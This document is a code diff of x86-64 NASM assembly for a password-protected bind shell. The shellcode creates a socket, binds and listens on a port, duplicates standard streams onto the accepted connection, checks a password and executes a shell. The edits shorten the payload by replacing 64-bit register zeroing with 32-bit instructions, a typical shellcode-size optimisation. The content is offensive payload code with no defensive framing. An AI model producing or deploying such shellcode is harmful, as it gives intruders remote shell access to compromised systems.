@@ -19,7 +19,7 @@ socket:
     pop rdi
     push 1
     pop rsi
-    xor rdx, rdx
+    xor edx, edx  ; shorter and will still zero the upper bytes
     syscall
 
     mov rdi, rax
@@ -43,7 +43,7 @@ bind:
     ; AF_INET = 2
     ; __NR_bind = 49
 
-    xor rax, rax
+    xor eax, eax
     push rax
     mov dword [rsp-4], eax
     sub rsp, 4
@@ -61,7 +61,7 @@ listen:
     ; __NR_listen = 50
 
     mov al, 50
-    xor rsi, rsi
+    xor esi, esi
     mov sil, 2
     syscall
 
@@ -70,7 +70,7 @@ accept:
     ; __NR_accept = 43
 
     mov al, 43
-    xor rsi, rsi
+    xor esi, esi
     ;xor rdx, rdx
     syscall
     
@@ -88,11 +88,11 @@ dup2:
     ; dup2(new, 2);
     ; __NR_dup2 = 33
 
-    xor al, al
+    xor eax, eax
 
     mov al, 33
     mov rdi, rbx
-    xor rsi, rsi
+    xor esi, esi
     syscall
 
     mov al, 33
@@ -104,7 +104,7 @@ dup2:
     syscall
 
 check_password:
-    xor rax, rax
+    xor eax, eax
     ; rdi = fd (bound socket)
     sub rsp, 16   ; create space for "buf" in the stack
     mov rsi, rsp  ; rsi = *buf
@@ -112,7 +112,7 @@ check_password:
     syscall
 
     ; compare password
-    xor rcx, rcx
+    xor ecx, ecx
     mov cl, [rel pass_len]
     lea rdi, [rel password]
     cld
@@ -123,6 +123,6 @@ execve:
     %include "execve-stack.nasm"
 
 exit:
-    xor rax, rax
+    xor eax, eax
     mov al, 60
     syscall
